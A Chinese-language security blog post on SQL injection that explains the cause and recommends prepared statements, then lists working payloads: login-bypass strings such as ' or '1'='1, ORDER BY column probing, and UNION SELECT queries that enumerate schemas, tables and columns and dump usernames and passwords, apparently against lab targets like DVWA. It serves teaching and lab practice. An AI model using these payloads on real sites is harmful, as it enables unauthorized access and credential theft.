---
title: Web安全：SQL注入
date: 2023-11-10
categories:
  - Web安全
tags:
  - Web安全
  - SQL注入
---


参考文章：[SQL注入原理](https://blog.csdn.net/yujia_666/article/details/90296495)

# 一. SQL注入概述

直接原因是没有对用户输入做检查，导致用户输入恶意SQL语句。根本原因是违反数据和代码分离的设计原则，将用户恶意输入当做代码进行执行。
有以下解决方案：
- 输入检查
- 预编译
其中预编译符合数据和代码分离的原则，提前为输入数据提供类型，编译时为数据部分预留空间。这样用户输入智能为某一数据类型，就解决了这个问题。
数据和代码分离原则，先用一个数据类型接收用户输入，再用代码操纵这个数据类型。预编译是一种实现方式。

# 二. SQL注入实例


## 情景一：输入账号，密码登录


### 后端查询语句：

*一般来说`#{}`这种形式是进行预编译的，而`{{}}`则没有。
查询语句：
`select * from user where username='{{}}' and password='{{}}'`
后端代码：

```
if affect_row==1:
    return "succeed"
else:
    return "fail"

```


### SQL万能密码：

如果用户名和密码都是字符类型：
输入：
*?username=xxx’ or ‘1’=’1&password=xxx’ or ‘1’=’1*
后端执行语句：
`select * from users where username='xxx' or '1'='1' and password='xxx' or '1'='1';`
输入：
*?username=xxx’ or 1=1;#&password=xxx*
后端执行语句：
`select * from users where username='xxx' or 1=1;#' and password='xxx';`
如果是数字类型：
把 *‘* 去掉就行。

## 情景二：根据id查询xxx信息

这里举一个根据id查找用户信息的例子。
查询语句：
`select xxx from user where id={{}}` 
后端代码：

```
    @Select("select * from user where id = {{id}}")
    public User getInfo(int id);

    user = new User();
    user = getInfo(id);

    return "用户名："+username+ '\n' +"密码："+password;

```


### 2. order by 测试

判断查询列数：
输入：`?id=1 order by 1`
输入：`?id=1 order by 2`
输入：`?id=1 order by ...`
确定查询列数为三，回显为后面两列内容
`?id=-1 union select 1,2,3 `

### 3. union 联合查询

*@@version_compile_os：查询操作系统版本*
*version()：查询数据库版本*
*user()：查询当前连接数据库的用户*
*database()：查询当前使用的数据库*
当前数据库：`SELECT schema_nameFROM information_schema.schemata;``?id=-1 union select 1,database(),3`
当前表：`?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= 'dvwa'`
表字段：`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'`
尝试注入：`?id=-1 union select 1,group_concat(username),group_cocat(password) from users`